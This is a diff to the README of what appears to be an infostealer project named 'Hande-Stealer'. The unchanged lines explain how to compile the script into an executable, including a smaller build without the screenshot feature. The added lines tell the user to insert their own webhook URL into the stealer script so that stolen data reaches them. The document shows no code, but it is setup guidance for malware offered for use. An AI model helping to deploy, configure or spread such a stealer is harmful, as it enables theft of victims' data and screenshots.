@@ -24,3 +24,6 @@
 ## Run compile.bat to convert file to exe...The size of exe file will be quite larger . If you need to produce smaller file then use compile_lite.bat ...But The screenshot option is removed in lighter version
 
 # Note :
+## Dont Forget to Change this with your webhook url >>>> https://github.com/swagkarna/Hande-Stealer/blob/fb15385349e7482baa46681216e137b9b745e33b/Hande-stealer.pyw#L27
+
+# ScreenShots :::
